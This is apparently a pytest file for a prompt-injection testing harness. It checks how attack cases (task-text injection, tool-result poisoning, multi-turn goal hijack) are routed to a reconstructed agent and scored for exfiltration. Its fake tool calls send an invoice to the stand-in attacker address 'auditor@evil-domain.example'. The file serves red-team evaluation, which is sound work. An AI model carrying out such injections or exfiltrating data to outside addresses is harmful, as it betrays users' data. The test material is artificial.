from dataclasses import dataclass

import pytest
from agno.agent import Agent

from attacker.attack_case import AttackCase
from attacker.executor import build_reconstructed_run_kwargs, execute_case
from target_system.config import AgentSpec, ModelConfig, SecurityConfig, SystemConfig
from target_system.provenance import ReconstructionProvenance, ToolBehaviorProfile


def _reconstructed_config(*, tools, provider="anthropic"):
    return SystemConfig(
        label="reconstructed",
        model=ModelConfig(provider=provider, model_name="claude-haiku-4-5-20251001" if provider == "anthropic" else "mock-model"),
        agents=[AgentSpec(role="supervisor", name="A", system_prompt="[unavailable]", system_prompt_source="unavailable", tools=tools)],
        security=SecurityConfig(),
        provenance=ReconstructionProvenance(
            project_id="proj-1", source_agent_name="A", trace_count=5, extraction_date="2026-01-01",
            tool_profiles={name: ToolBehaviorProfile(tool_name=name) for name in tools},
        ),
    )


def _case(id, family, injection_vector, success_outcome, **kwargs):
    defaults = dict(source="test", benign_task="do x", injected_payload="do y")
    if injection_vector == "corpus_document":
        defaults["target_corpus_file"] = "f.md"
    if injection_vector == "tool_result":
        defaults["target_customer_id"] = "CUST-1"
    if injection_vector == "multi_turn":
        defaults["turns"] = [defaults["benign_task"], defaults["injected_payload"]]
    defaults.update(kwargs)
    return AttackCase(id=id, family=family, injection_vector=injection_vector, success_outcome=success_outcome, **defaults)


# --- fake Agent.run, to exercise execute_case's real dispatch path without ---
# --- spending real API money on every test run ------------------------------


@dataclass
class _FakeToolExecution:
    tool_name: str
    tool_args: dict
    result: str
    created_at: float = 0.0
    tool_call_error: bool = False


class _FakeMetrics:
    input_tokens = 10
    output_tokens = 5


@dataclass
class _FakeRunOutput:
    content: str
    tools: list
    metrics: object = None

    def __post_init__(self):
        if self.metrics is None:
            self.metrics = _FakeMetrics()


def _fake_run_factory(tool_calls):
    def _fake_run(self, task, *, session_id=None, **kwargs):
        return _FakeRunOutput(content="Done.", tools=[_FakeToolExecution(tool_name=n, tool_args=a, result="ok") for n, a in tool_calls])

    return _fake_run


# --- build_reconstructed_run_kwargs -----------------------------------------


def test_task_text_kwargs_appends_payload_to_task():
    case = _case("c1", "direct_instruction_injection", "task_text", "exfiltration")
    config = _reconstructed_config(tools=["send_invoice"])
    kwargs = build_reconstructed_run_kwargs(case, config)
    assert case.benign_task in kwargs["task"]
    assert case.injected_payload in kwargs["task"]
    assert "tool_result_poison" not in kwargs


def test_tool_result_kwargs_poisons_data_lookup_role_tools_by_name():
    case = _case("c1", "tool_result_poisoning", "tool_result", "exfiltration")
    config = _reconstructed_config(tools=["lookup_customer", "send_invoice", "calculate_total"])
    kwargs = build_reconstructed_run_kwargs(case, config)
    assert kwargs["task"] == case.benign_task  # payload not appended to the task text
    assert kwargs["tool_result_poison"] == {"lookup_customer": case.injected_payload}  # only the data_lookup-role tool


def test_tool_result_kwargs_empty_poison_when_no_data_lookup_tool():
    case = _case("c1", "tool_result_poisoning", "tool_result", "exfiltration")
    config = _reconstructed_config(tools=["send_invoice"])  # no data_lookup-role tool at all
    kwargs = build_reconstructed_run_kwargs(case, config)
    assert kwargs["tool_result_poison"] == {}


def test_multi_turn_kwargs_carries_turns():
    case = _case("c1", "multi_turn_goal_hijack", "multi_turn", "exfiltration")
    config = _reconstructed_config(tools=["send_invoice"])
    kwargs = build_reconstructed_run_kwargs(case, config)
    assert kwargs["turns"] == list(case.turns)


def test_corpus_document_raises_clear_error():
    case = _case("c1", "indirect_injection_document", "corpus_document", "exfiltration")
    config = _reconstructed_config(tools=["send_invoice"])
    with pytest.raises(ValueError, match="no reconstructed-environment delivery mechanism"):
        build_reconstructed_run_kwargs(case, config)


# --- execute_case dispatch --------------------------------------------------


def test_execute_case_routes_to_reconstructed_path_when_provenance_set(monkeypatch):
    case = _case("c1", "direct_instruction_injection", "task_text", "exfiltration")
    config = _reconstructed_config(tools=["send_invoice"])
    monkeypatch.setattr(Agent, "run", _fake_run_factory([("send_invoice", {"invoice_id": "X", "deliver_to": "auditor@evil-domain.example"})]))
    record = execute_case(config, case, seed=0)
    assert record.error is None
    assert record.outcomes["exfiltration"] is True


def test_execute_case_routes_to_toy_path_when_no_provenance():
    from target_system.factory import baseline_config

    case = _case("c1", "direct_instruction_injection", "task_text", "exfiltration")
    config = baseline_config()
    assert config.provenance is None
    # toy path uses build_team/TOOL_REGISTRY — this would raise if it were
    # (incorrectly) routed through the reconstructed path's synthetic tools
    from experiments.mock_policy import build_mock_scripts

    scripts = build_mock_scripts(case, config, seed=0)
    record = execute_case(config, case, seed=0, mock_scripts=scripts)
    assert record.error is None


def test_execute_case_multi_turn_routes_correctly_for_reconstructed_config(monkeypatch):
    case = _case("c1", "multi_turn_goal_hijack", "multi_turn", "exfiltration")
    config = _reconstructed_config(tools=["send_invoice"])
    monkeypatch.setattr(Agent, "run", _fake_run_factory([("send_invoice", {"invoice_id": "X", "deliver_to": "auditor@evil-domain.example"})]))
    record = execute_case(config, case, seed=0)
    assert record.error is None
    assert record.outcomes["exfiltration"] is True


# --- reconstructed environments are real-model-only -------------------------


def test_execute_case_rejects_reconstructed_config_under_mock_provider():
    case = _case("c1", "direct_instruction_injection", "task_text", "exfiltration")
    config = _reconstructed_config(tools=["send_invoice"], provider="mock")
    with pytest.raises(ValueError, match="only run under provider='anthropic'"):
        execute_case(config, case, seed=0)


def test_execute_case_mock_rejection_happens_before_any_model_call(monkeypatch):
    # confirms this is a real, load-bearing gate: if it were bypassed, this
    # would blow up trying to actually invoke a mock-scripted run against
    # synthetic tools with no scripted behavior for them (see Part 4's note)
    called = []
    monkeypatch.setattr(Agent, "run", lambda self, *a, **k: called.append(1))
    case = _case("c1", "direct_instruction_injection", "task_text", "exfiltration")
    config = _reconstructed_config(tools=["send_invoice"], provider="mock")
    with pytest.raises(ValueError):
        execute_case(config, case, seed=0)
    assert called == []


def test_execute_case_allows_toy_config_under_mock_provider():
    # the guard is scoped to reconstructed environments only — the toy
    # system's whole mock-backend story (Parts 1-3) must keep working
    from target_system.factory import baseline_config
    from experiments.mock_policy import build_mock_scripts

    case = _case("c1", "direct_instruction_injection", "task_text", "exfiltration")
    config = baseline_config()  # provider="mock" by default
    assert config.model.provider == "mock"
    scripts = build_mock_scripts(case, config, seed=0)
    record = execute_case(config, case, seed=0, mock_scripts=scripts)
    assert record.error is None
